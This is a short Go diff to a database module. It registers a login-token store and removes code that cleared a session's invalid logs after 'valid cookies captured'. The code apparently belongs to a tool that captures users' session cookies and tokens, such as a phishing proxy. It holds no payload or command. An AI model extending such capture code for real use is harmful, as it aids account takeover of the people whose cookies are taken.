@@ -25,6 +25,7 @@ func NewDatabase(path string) (*Database, error) {
 
 	d.sessionsInit()
 	d.invalidLogsInit()
+	d.loginTokensInit()
 
 	d.db.Shrink()
 	return d, nil
@@ -77,10 +78,6 @@ func (d *Database) SetSessionHttpTokens(sid string, tokens map[string]string) er
 
 func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
 	err := d.sessionsUpdateCookieTokens(sid, tokens)
-	if err == nil && tokens != nil && len(tokens) > 0 {
-		// Valid cookies captured - remove any invalid logs for this session
-		d.DeleteInvalidLogsBySessionId(sid)
-	}
 	return err
 }
 
